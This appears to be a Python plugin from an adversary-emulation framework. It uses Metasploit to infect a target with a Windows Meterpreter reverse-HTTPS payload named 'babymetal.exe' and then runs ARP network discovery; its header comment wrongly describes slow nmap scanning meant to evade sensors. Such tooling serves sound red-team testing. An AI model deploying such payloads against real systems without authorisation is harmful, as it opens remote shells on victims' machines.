#!/usr/bin/env python3

# A plugin to nmap targets slow motion, to evade sensors

from plugins.base.attack import AttackPlugin, Requirement


class MetasploitArpPlugin(AttackPlugin):

    # Boilerplate
    name = "metasploit_arp"
    description = "Network discovery via metasploit using arp"
    ttp = "T1016"
    references = ["https://attack.mitre.org/techniques/T1016/"]

    required_files = []    # Files shipped with the plugin which are needed by the kali tool. Will be copied to the kali share
    requirements = [Requirement.METASPLOIT]

    def __init__(self):
        super().__init__()
        self.plugin_path = __file__

    def run(self, targets):
        """ Run the command

        @param targets: A list of targets, ip addresses will do
        """

        res = ""
        payload_type = "windows/x64/meterpreter/reverse_https"
        payload_name = "babymetal.exe"
        target = self.targets[0]

        # self.connect_metasploit()

        self.metasploit.smart_infect(target,
                                     payload=payload_type,
                                     outfile=payload_name,
                                     format="exe",
                                     architecture="x64")

        self.metasploit.arp_network_discovery(target)

        return res
